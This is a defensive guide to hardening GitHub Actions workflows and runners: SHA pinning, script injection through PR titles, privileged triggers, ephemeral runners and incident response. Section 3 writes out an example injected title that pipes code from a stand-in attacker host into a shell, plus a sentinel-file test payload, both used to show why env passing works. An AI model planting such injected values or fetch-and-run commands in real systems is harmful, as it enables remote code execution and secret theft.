# Workflow and Runner Hardening

> **Who this is for**: Engineers protecting CI/CD from malicious pull requests, compromised actions, secret exposure, and runner persistence.

## The short version

A pull-request job runs untrusted code, titles, and branch names with the job's repository token, secrets, and network access. The fix isn't one setting — it's making sure the job's execution authority never exceeds what that untrusted input is trusted to do.

**What you need (4 things):**
1. A `pull_request` trigger (never `pull_request_target`), so the token stays read-only and no secrets are in scope.
2. `permissions: contents: read` set explicitly, not left to the repository default.
3. A full-SHA-pinned `actions/checkout` step with `persist-credentials: false`, since this job never pushes.
4. The untrusted PR title passed through `env`, never spliced into the script text.

**The code:**

```yaml
on: pull_request
permissions:
  contents: read
jobs:
  validate-pr-title:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
        with:
          persist-credentials: false
      - name: Check pull-request title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          set -euo pipefail
          if [[ "$PR_TITLE" =~ ^feat: ]]; then
            echo "title check passed: $PR_TITLE"
          else
            echo "::error::title '$PR_TITLE' does not start with feat:"
            exit 1
          fi
```

**Success signal:** a title starting with `feat:` prints `title check passed: <title>` and the step exits 0. A title that doesn't match fails the step with the exact line `::error::title '<title>' does not start with feat:`.

**Not handled yet:** [privileged workflows](#4-untrusted-code-and-privileged-secrets-must-never-share-a-job), [runner isolation](#7-a-reused-runner-carries-the-last-jobs-leftovers-forward), [governance](#9-whoever-can-edit-the-workflow-can-redirect-the-deployment), [incident response](#10-compromise-response-follows-contain-investigate-recover), and [artifact boundaries](#4-untrusted-code-and-privileged-secrets-must-never-share-a-job).

---

For the token and OIDC model behind `permissions: contents: read`, see [Permissions, Secrets, and OIDC](01_permissions_secrets_and_oidc.md) — read after this baseline, not before it.

> **Core:** the trigger, the explicit permission, the full-SHA pin, and the `env` boundary in the job above are the non-negotiable baseline for any workflow that touches a pull request. Sections 2–6 explain why each piece is there and how to harden it further.

---

## 1. Untrusted Input Runs With the Job's Full Authority

```text
untrusted inputs
├── pull-request code
├── branch, title, body, labels, and commit text
├── manual or dispatch inputs
├── dependencies and build tools
├── caches and artifacts
└── third-party actions
          │
          ▼
runner executes code
          │
          ├── repository token
          ├── workspace content
          ├── network access
          ├── caches and artifacts
          └── cloud or signing identity
```

> **Key insight**: workflow security is alignment between input trust and execution authority — matching what a piece of input is trusted to be with what the job touching it can actually do. It isn't a property the YAML file has on its own; the same `permissions:` block is safe on one trigger and a vulnerability on another.

---

## 2. Only a Full Commit SHA Actually Pins an Action

A **SHA** — the full 40-character commit object identifier that names one exact, immutable commit, unlike a tag or branch name that can be repointed — is the only action reference GitHub documents as immutable.

Here's why that distinction matters: a publisher's account or release pipeline gets compromised — a phished token, a hijacked CI job — and the attacker force-moves the `v2` tag to a new commit carrying a credential-stealing payload. Nothing in your workflow file changes. The next run that references `third-party/example-action@v2` resolves that tag at execution time, pulls the attacker's commit, and executes it with your job's repository token, secrets, and network access — the same authority as every other step in the job. Pin `@<full-sha>` instead and the reference names the commit object itself; moving the tag afterward doesn't move what your workflow executes.

```yaml
# ✅ Immutable action source
- uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
  with:
    persist-credentials: false

# ❌ A movable tag is easier to read but is not immutable
- uses: third-party/example-action@v2
```

v6 also changed where a persisted credential lives — a separate file instead of embedded in `.git/config` — and needs a runner with Node.js 24 support; worth checking if you run older self-hosted runner images. Source: [actions/checkout](https://github.com/actions/checkout), checked 2026-08-14.

Verify that the SHA belongs to the expected upstream repository, keep the release tag in a comment, and use Dependabot or Renovate to propose updates. What happens to those proposed updates after they open — review tiering, the required-CI gate they still have to clear, and how a stale pin gets flagged before it becomes a liability — is [Dependency Update Governance](04_dependency_update_governance.md).

Apply the same rule to:

- reusable workflows from other repositories;
- composite actions;
- container actions and base images by digest;
- downloaded binaries and install scripts by checksum.

Repository and organization Actions policies can restrict which actions may run and require full-SHA pinning.

---

## 3. An Interpolated Expression Becomes Shell Code, Not Data

Vulnerable:

```yaml
- name: Check pull-request title
  run: |
    title="${{ github.event.pull_request.title }}"
    [[ "$title" =~ ^feat: ]]
```

GitHub expands `${{ github.event.pull_request.title }}` into literal text before the runner ever sees a shell script — the runner executes whatever string results, not a parameterized value. A title like `x"; curl attacker.example | sh #` is still just a title, but once expanded it also becomes live shell text: the generated script reads `title="x"; curl attacker.example | sh #"`, and the injected command runs with the job's token and network access.

Safer:

```yaml
- name: Check pull-request title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    set -euo pipefail
    if [[ "$PR_TITLE" =~ ^feat: ]]; then
      echo "title check passed: $PR_TITLE"
    else
      echo "::error::title '$PR_TITLE' does not start with feat:"
      exit 1
    fi
```

`env:` hands the title to the shell as a real environment variable, set once before the script text is parsed — there's no second pass where its contents get read back in as code. The acceptance test below drives that same check body through a normal title, a title carrying shell metacharacters, and a title that simply fails the pattern, so the boundary is demonstrated rather than asserted:

```bash
# same check body as the step above, run directly, no GitHub Actions runner required
check_pr_title() {
  local PR_TITLE="$1"
  if [[ "$PR_TITLE" =~ ^feat: ]]; then
    echo "title check passed: $PR_TITLE"
  else
    echo "::error::title '$PR_TITLE' does not start with feat:"
    return 1
  fi
}

check_pr_title "feat: add retry budget"
# title check passed: feat: add retry budget         <- exits 0

rm -f /tmp/pwned_sentinel
check_pr_title 'feat: x"; touch /tmp/pwned_sentinel; echo "pwned' || true
[[ -f /tmp/pwned_sentinel ]] && echo "INJECTION SUCCEEDED" || echo "sentinel absent - injection stayed inert"
# sentinel absent - injection stayed inert           <- shell metacharacters never ran as commands

check_pr_title "update readme" || true
# ::error::title 'update readme' does not start with feat:   <- exits 1, this is the exact failed-check line
```

Every line above is real output from running the three cases as shown. The malicious title matches the `^feat:` prefix and would pass a naive review, but no command inside it executes — the sentinel file never appears, because `env:` never let the shell re-read the title as syntax.

Best for complex logic:

```yaml
- name: Validate pull-request metadata
  env:
    EVENT_PATH: ${{ github.event_path }}
  run: python scripts/validate_pr_event.py "$EVENT_PATH"
```

The script parses JSON as data, validates schema and length, and never constructs a shell command from the value.

Treat branch names as untrusted too; Git permits characters that can be meaningful to a shell.

---

## 4. Untrusted Code and Privileged Secrets Must Never Share a Job

```text
pull_request workflow
    untrusted code
    read-only token
    no production secrets
    isolated hosted runner
        │
        └── test evidence

privileged deployment workflow
    accepted main-branch code
    protected environment
    OIDC role
    deployment runner/network
```

That deployment job's **OIDC role** — OpenID Connect, a federated-identity protocol that lets the runner exchange a short-lived signed token for cloud credentials instead of a stored secret — is only safe because the code running in it already passed review. Two GitHub event contexts break that separation by handing privileged authority to a job that still runs on unreviewed input: **`pull_request_target`**, which triggers on a fork's pull request but always executes in the base repository's context — with its secrets and write-scoped token — even while checking out the fork's own code; and **`workflow_run`**, which triggers after another workflow finishes and inherits the triggering repository's default token and secrets, even when the workflow it followed ran attacker-supplied PR code.

Walk the first one through: a workflow on `pull_request_target` checks out the PR's own branch to reuse an existing test job — a common shortcut. The checkout pulls attacker-controlled code, but the job still carries the base repository's write-scoped token and secrets, because `pull_request_target` always runs with the target repository's context regardless of whose code it checked out. That code now executes with deployment-adjacent authority: it can exfiltrate secrets over the network, or push using the token.

Avoid combining the two through `pull_request_target`.

If a privileged workflow consumes an artifact produced by an untrusted workflow:

- accept only a narrow data format;
- prevent path traversal during extraction;
- enforce size and file-count limits;
- verify checksums and expected producer identity;
- never execute scripts or binaries from the artifact;
- do not trust a filename or digest supplied only by the producer.

The same hand-off happens through `workflow_run`: a first workflow — correctly scoped read-only, running attacker PR code — uploads an artifact; a second, privileged workflow triggered by `workflow_run` downloads and extracts it, trusting its own producer by default, then runs a script from inside it. The extraction step itself — path traversal into `.github/workflows/`, or executing a checked-in script pulled from the archive — is what hands the attacker the second workflow's token, secrets, or network reach. Neither workflow individually ran untrusted code with elevated permissions; the artifact hand-off is where the authority crosses the boundary. A `workflow_run` consumer can be privileged even when the producing workflow was not — treat the artifact boundary like an external upload.

---

## 5. Checkout Defaults Leave a Push-Capable Credential Behind

```yaml
- uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
  with:
    fetch-depth: 1
    persist-credentials: false
    submodules: false
```

- Set `persist-credentials: false` when later Git commands do not need the token.
- Fetch only the history needed by the job.
- Treat submodules as additional code dependencies and pin them.
- Never check out an attacker-controlled ref in a privileged job.
- Use an explicit commit SHA when transferring a reviewed change between jobs.
- Validate the remote and target before any automation pushes.

When automation must push, give that job a dedicated token and permission; do not leave write credentials in every build step.

---

## 6. Every Action You Add Is Unreviewed Code Inside Your Job

Every JavaScript, Docker, or composite action runs inside the job's authority.

Before adopting an action, review:

- publisher and repository ownership;
- maintenance and release history;
- transitive package dependencies;
- network calls and telemetry;
- required inputs and permissions;
- how releases map to commit SHAs;
- security advisories and update process.

Prefer a small repository script over a third-party action that wraps one simple command. Prefer GitHub-owned or vendor-owned actions for platform authentication, but still pin and scope them.

---

## 7. A Reused Runner Carries the Last Job's Leftovers Forward

> **Production:** this section is what you add once GitHub-hosted runners can't meet a private-networking, specialized-hardware, compliance, or controlled-toolchain requirement. Skip it while a hosted runner still covers your case.

GitHub-hosted runners provide a clean hosted environment per job — the platform provisions and destroys the VM for you. A self-hosted runner that stays registered across jobs can leak workspace data, credentials, processes, Docker layers, or modified tooling into whatever job lands on it next; the team, not GitHub, now owns that isolation.

```text
job queued
    ↓
provision clean runner                     ← one-job ephemeral lifecycle
    ↓
register as ephemeral / just-in-time       ← scoped to this repository + workflow
    ↓
execute one job                            ← isolated cloud identity, no long-lived creds on disk
    ↓
forward logs externally (runner is about to be destroyed)
    ↓
destroy runner and storage
    ↓
verify: runner absent from the repo's runner list, instance terminated, volume gone
```

**How you know it's working:** after the job finishes, `GET /repos/{owner}/{repo}/actions/runners` (or the runner-group listing in the UI) no longer lists that runner's name at all — not marked offline, absent — and the cloud side confirms the backing instance has reached a terminated/deallocated state with its attached volume deleted.

⚠️ The silent failure: a runner whose process crashed mid-job, or whose own destroy step failed, still shows as **idle** or **offline** in GitHub's runner list while the VM keeps running and billing in your cloud account. That's an orphaned runner nobody is using, or a surviving volume that carries the last job's workspace, credentials, and build cache into whatever picks up that disk next. Alert on any runner registered longer than one job's expected duration, and on any instance or volume from the runner pool that outlives its runner registration.

Production self-hosted controls — the marked items below are the minimum baseline; the rest raise the bar further:

- **one job per ephemeral runner** — the lifecycle traced above;
- immutable runner image and rapid patching;
- no public-repository or arbitrary-fork jobs on privileged runners;
- **runner groups limited to approved repositories and workflows** — repository/workflow scoping;
- minimal outbound network access and no broad internal-network reach;
- **isolated cloud identity per workload** and **no long-lived credentials on disk** — credential isolation;
- external logs because the runner is destroyed;
- resource and execution limits;
- **cleanup verified after abnormal termination** — the externally observable destruction check above, not a log line claiming cleanup ran.

GitHub recommends ephemeral self-hosted runners for autoscaling. Actions Runner Controller is the recommended Kubernetes-based autoscaling solution for teams operating Kubernetes.

---

## 8. Logs, Artifacts, and Caches Outlive the Job and Leak Quietly

Logs:

- turn off shell tracing around sensitive work;
- never dump complete contexts;
- review crash output and debug bundles;
- use `::add-mask::` only as defense in depth;
- restrict retention and access where logs contain operational detail.

Artifacts:

- upload allowlisted paths, not the workspace root;
- avoid secrets and production data;
- name with run ID and attempt;
- validate before privileged consumption.

Caches:

- never contain secrets or release signatures;
- are restored as untrusted;
- should be namespaced by lockfile and tool version;
- must not be the only copy of an artifact.

---

## 9. Whoever Can Edit the Workflow Can Redirect the Deployment

> **Production:** this assumes the baseline job and the ephemeral-runner controls above are already in place. It protects the pipeline definition itself, not any single run of it.

Add code ownership for:

```text
/.github/workflows/
/.github/actions/
/scripts/release/
/infra/
/migrations/
/Dockerfile
```

Enforce:

- required review from platform/security owners;
- ruleset protection against force pushes and deletion;
- approved-action and full-SHA policies;
- read-only default token permissions;
- audit-log review for workflow, secret, runner, environment, and ruleset changes;
- separate approval for changes that both expand permission and consume that permission.

An attacker who can alter the deployment workflow can often alter what gets deployed, even without direct access to cloud credentials.

---

## 10. Compromise Response Follows Contain, Investigate, Recover

This is what happens after a control above has already failed — an operational continuation of the controls in the rest of this note, not a new preventive mechanism.

```text
contain
├── disable affected workflow or runner group
├── revoke app tokens, PATs, and cloud sessions
├── rotate exposed secrets and signing keys
└── stop promotion of suspect artifacts

investigate
├── workflow refs, action SHAs, logs, and audit events
├── runner image and network activity
├── produced artifact digests and attestations
└── downstream deployments and consumers

recover
├── restore reviewed workflow version
├── rebuild from trusted source on clean runners
├── verify or replace deployed artifacts
└── add detection and policy controls
```

A **PAT** — personal access token, a credential bound to an individual user's own permissions rather than scoped to one workflow run — often outlives any single job and works from outside GitHub Actions entirely. That's exactly why revoking it belongs in the contain phase rather than waiting for investigation to finish: unlike a job-scoped `GITHUB_TOKEN` or an OIDC-issued credential, nothing expires it automatically.

Cache namespaces and runner images may need rotation even if no secret was visibly logged.

---

## 11. References

- [Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use)
- [Script injections](https://docs.github.com/en/actions/concepts/security/script-injections)
- [Self-hosted runners reference](https://docs.github.com/en/actions/reference/runners/self-hosted-runners)
- [Managing Actions settings](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/managing-repository-settings/managing-github-actions-settings-for-a-repository)
- [actions/checkout](https://github.com/actions/checkout)

---

**Next**: [SBOM, Provenance, and Artifact Attestations](03_sbom_provenance_and_attestations.md)
